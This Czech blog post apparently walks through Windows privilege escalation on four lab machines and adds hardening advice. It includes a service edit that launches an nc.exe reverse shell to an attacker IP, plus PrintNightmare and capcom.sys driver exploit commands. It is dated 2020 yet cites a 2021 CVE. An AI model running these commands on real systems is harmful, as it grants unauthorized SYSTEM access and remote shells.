---
layout: post
author: Tomáš Matějíček
title: "Windows lokální privesc přes služby, drivery a spooler"
date: 2020-11-14
tags: windows privesc services drivers spooler system
---
## Úvod a kontext

Po prvním shellu na Windows hostu padá často stejná otázka: co teď má největší šanci vést k `SYSTEM`? Chyba bývá v tom, že se odpověď hledá jako seznam exploitů. Ve skutečnosti je užitečnější rozdělit si lokální privesc podle typu primitiva, které na hostu skutečně existuje. [Buff](/buff), [Control](/control), [Driver](/driver) a [Fuse](/fuse) ukazují čtyři velmi praktické rodiny:

- zneužitelná služba a její ACL,
- lokální zranitelná aplikace dostupná až po footholdu,
- spooler a Point-and-Print jako systémová služba s vysokými právy,
- možnost načíst nebo spustit zranitelný driver.

Smysl článku není v katalogu CVE. Smysl je v rozhodování. Po footholdu je důležitější poznat, jaký typ moci už máš nad hostem, než bezhlavě spouštět každý veřejný exploit.

## Tři otázky, které dávají smysl hned po footholdu

### 1. Můžu změnit, co spustí privilegovaná služba

Tady jde typicky o:

- zapisovatelný `ImagePath`,
- slabá ACL v registru služby,
- nebo jinou konfiguraci, kterou služba používá jako `LocalSystem`.

Tohle je konfigurační chyba, ne patch gap.

### 2. Běží na hostu privilegovaná systémová komponenta se známým zneužitelným tokem

Typickým příkladem je spooler. Tady už se většinou pohybuješ v rovině zranitelnosti nebo nedostatečně zpevněné systémové feature.

### 3. Je na hostu software nebo driver, který je z lokálu zneužitelný

To je rodina případů, kde foothold nepřichází přímo z webu nebo SMB, ale z toho, že už běžíš na kompromitovaném hostu a můžeš se dostat k localhost-only službě, binárce nebo driveru.

## Control: když služba běží jako `LocalSystem`, ale její `ImagePath` není chráněný

Control je velmi čistý příklad toho, proč má smysl číst služby jako bezpečnostní boundary. Webová část skončí WinRM shellem pro `hector`, ale root/admin už nepadne na další webové chybě. Rozhodne až lokální enumerace.

Důležitá vodítka přijdou z `ConsoleHost_history.txt`, která naznačí zájem o:

- `HKLM:\SYSTEM\CurrentControlSet`,
- ACL v registru,
- a konkrétně konfiguraci služeb.

Jakmile běžný uživatel může přepsat `ImagePath` služby běžící jako `LocalSystem`, je to v praxi téměř totéž jako přímé `SYSTEM`. Ne proto, že by uměl obejít UAC nebo kernel. Ale proto, že už rozhoduje o tom, jaký příkaz tato privilegovaná služba spustí:

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Services\<service> /v ImagePath /t REG_EXPAND_SZ /d "cmd /c c:\programdata\nc.exe -e cmd.exe 10.10.15.217 4002" /f
sc start <service>
```

Control je důležitý hlavně metodicky:

- nejde o exploitační chybu ve službě,
- nejde o nový kernel bug,
- jde o chybu v delegaci lokální konfigurace.

To je přesně moment, kdy je potřeba odlišit zranitelnost od chybné správy oprávnění.

## Driver: PrintNightmare jako zneužitelný systémový tok

Driver ukazuje jinou kategorii. Po cracknutí hashe `tony` a přihlášení přes WinRM už není rozhodující lokální konfigurace nějaké vlastní služby. Důležitý je systémový spooler a chyba `CVE-2021-1675`, známá jako PrintNightmare.

Tady už se nepohybuješ v rovině "můžu přepsat konfiguraci". Pohybuješ se v rovině:

- systémová služba má vysoká práva,
- umí načíst útočníkem dodanou DLL,
- a host nebo doména nejsou dostatečně opravené nebo zpevněné.

Praktický exploit vypadá jednoduše:

```bash
impacket-smbserver data .
python3 CVE-2021-1675.py tony:liltony@10.10.11.106 '\\10.10.14.11\data\rev64.dll'
```

Ale bezpečnostní význam je jiný než na Control:

- na Control rozhodla chyba v ACL,
- na Driver rozhodl systémový patch gap a zneužitelný spooler tok.

To je přesně rozdíl, který je potřeba držet jak při technické analýze, tak při reálném incident response.

## Buff: lokální foothold má hodnotu i proto, že otevře localhost-only software

Buff je užitečný jako protiváha ke službám a spooleru. Web na portu `8080` dává první shell přes zranitelný `Gym Management System 1.0`, ale lokální privesc už neleží v další systémové službě Windows. Leží v nainstalované aplikaci `CloudMe 1.11.2`.

To je velmi praktická rodina privescu:

- software nemusí být dostupný zvenku,
- nemusí mít veřejný management port,
- ale z kompromitovaného hostu je najednou dosažitelný přes localhost nebo přímo jako lokální proces.

V Buff právě tohle rozhodlo. Jakmile byl na hostu stabilní shell, dávalo smysl přestat řešit web a začít se dívat na:

- seznam nainstalovaných aplikací,
- jejich verze,
- lokální listening sockety,
- a známé lokální exploity.

Výsledkem byl buffer overflow v `CloudMe 1.11.2`, který už šel z lokálního kontextu proměnit v `SYSTEM`. Důležitá lekce je, že po footholdu se útoková plocha dramaticky rozšíří. To, co nebylo z internetu dosažitelné, se najednou stává plně relevantní.

## Fuse: když servisní účet umí načíst zranitelný driver

Fuse doplňuje poslední důležitou kategorii: driver abuse. Účet `svc-print` není na první pohled plný administrátor, ale dovolí nahrát a zaregistrovat zranitelný driver `capcom.sys`. To je zásadní, protože v tu chvíli už nehraje hlavní roli web, LDAP ani WinRM. Hlavní roli hraje vztah mezi:

- účtem,
- oprávněním pracovat s driverem,
- a přítomností známého zranitelného kernelového modulu.

Praktický sled kroků vypadá takto:

```text
EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys
ExploitCapcom_modded.exe
```

Tady je důležité dobře pojmenovat příčinu:

- root nepřišel jen proto, že "na hostu byl starý driver",
- přišel proto, že kompromitovaný účet uměl zneužít driver loading workflow.

Fuse tak dobře ukazuje, že samotná přítomnost zranitelného driveru ještě nemusí stačit. Rozhodne až to, kdo ho umí aktivovat a jaká lokální práva má foothold účet.

## Jak rozhodovat po footholdu

Místo mechanického "spusť všechno, co najdeš" se vyplatí jít v tomto pořadí.

### 1. Služby a jejich ACL

Hledej:

- zapisovatelný `ImagePath`,
- slabá práva v registru pod `HKLM:\SYSTEM\CurrentControlSet\Services`,
- možnost startovat nebo měnit službu běžící jako `LocalSystem`.

To je často nejčistší a nejstabilnější cesta.

### 2. Systémové feature s vysokými právy

Typicky:

- spooler,
- Point-and-Print,
- další služby, které načítají binárky, DLL nebo konfiguraci.

Tady rozhoduje patch level a skutečná konfigurace služby.

### 3. Lokální software třetích stran

Kontroluj:

- nainstalované aplikace,
- desktop klienty,
- lokální listening porty,
- známé lokální overflow nebo privilege boundary chyby.

### 4. Driver loading a kernelové primitivum

Tohle má smysl až ve chvíli, kdy foothold účet skutečně umí:

- načíst driver,
- zapsat ho do místa, odkud se dá použít,
- nebo jinak zneužít lokální kernelový tok.

## Rozdíl mezi konfigurací, zranitelností a patch gap

Právě tady se windowsový privesc často popisuje nepřesně. Je užitečné držet tato rozlišení:

### Chybná konfigurace

Control je typický příklad. Služba je navržená tak, jak má být, ale její lokální ACL dovolují běžnému uživateli měnit, co se spustí jako `LocalSystem`.

### Zranitelnost nebo patch gap v privilegované komponentě

Driver je typický příklad. Problém neleží v tom, že by si admin špatně nastavil `ImagePath`. Problém je v tom, že spooler s vysokými právy špatně zpracuje celý Point-and-Print tok.

### Lokální aplikace zneužitelná až po footholdu

Buff sem zapadá velmi dobře. Jde o zranitelnou aplikaci, ale její hodnota pro útok vznikne až ve chvíli, kdy už jsi na hostu.

### Driver abuse

Fuse ukazuje kombinaci starého zranitelného driveru a oprávnění kompromitovaného účtu s ním pracovat. Tady je rozhodující vztah mezi lokálními právy a kernelovou vrstvou.

## Obrana a hardening

### 1. Auditovat služby jako lokální trust boundary

Práva k registru služeb, `ImagePath`, start/stop oprávnění a kontext `LocalSystem` je potřeba brát stejně vážně jako `sudoers` na Linuxu.

### 2. Tvrdě řídit spooler a Point-and-Print

Pokud služba nepotřebuje běžet, vypnout ji. Pokud musí běžet, je potřeba mít jasně pod kontrolou patch level a konfiguraci, která omezuje načítání cizích ovladačů a DLL.

### 3. Inventarizovat a patchovat software třetích stran

CloudMe, pomocné klienty, admin utility a desktop aplikace jsou po footholdu plnohodnotná útoková plocha. Nestačí patchovat jen IIS, RDP a Exchange.

### 4. Omezit driver loading a blokovat známé zranitelné drivery

Tam, kde to dává smysl, pomáhá:

- WDAC,
- HVCI,
- bloklist známých zranitelných driverů,
- a minimální okruh účtů, které vůbec umí s drivery pracovat.

### 5. Servisní účty neposuzovat jen podle názvu

Účet `svc-print` může mít bezpečnostně mnohem větší dopad, než by odpovídalo jeho jménu. Rozhodují skutečná lokální práva, ne label účtu.

## Shrnutí klíčových poznatků

- Windows lokální privesc po footholdu dává největší smysl číst podle typu primitiva: služba, spooler, lokální software nebo driver.
- Control ukazuje konfigurační chybu ve službě, Driver systémový patch gap kolem spooleru, Buff lokální zranitelnou aplikaci a Fuse driver abuse.
- Nejdůležitější není počet exploitů v toolboxu, ale schopnost přesně rozlišit, zda máš před sebou chybnou konfiguraci, zranitelnost nebo příliš silná práva kompromitovaného účtu.
- Obrana stojí hlavně na service ACL review, patchingu systémových feature, inventarizaci software třetích stran a kontrole driver loading práv.

## Co si odnést do praxe

- Po footholdu na Windows se nejdřív neptej "jaký exploit na `SYSTEM` znám". Ptej se "jaký typ moci už na hostu mám".
- Služby, spooler, lokální klienti a drivery jsou čtyři rozdílné rodiny problémů a je užitečné je při analýze i obraně držet odděleně.
- Jakmile běžný nebo servisní účet může ovlivnit to, co poběží jako `LocalSystem` nebo v kernelu, je cesta k `SYSTEM` obvykle mnohem kratší než hledání další vzdálené chyby.
